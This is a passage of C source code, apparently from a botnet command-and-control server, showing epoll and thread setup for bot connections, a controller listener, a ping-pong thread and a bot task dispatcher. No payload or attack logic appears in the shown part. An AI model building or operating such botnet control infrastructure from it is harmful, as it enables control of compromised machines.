    if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &event)) == -1) 
    {
    	printf("[Main] Failed to add listen to epoll\n");
		terminate();
    }

    pthread_t thread[threads + 3];
    while (threads--)
		pthread_create(&thread[threads + 3], NULL, &bot_event, (void *) NULL);

    if ((s = create_and_bind(argv[2])) == -1)
    {
    	printf("[Main] Failed to bind controller\n");
    	terminate();
    }

    pthread_create(&thread[2], NULL, &controller_listen, &s);
    pthread_create(&thread[1], NULL, &ping_pong_thread, &s);
    pthread_create(&thread[0], NULL, &bot_task_thread, &s);

    while (1) 
    	sleep(1);

    close(listen_fd);
    return EXIT_SUCCESS;
}
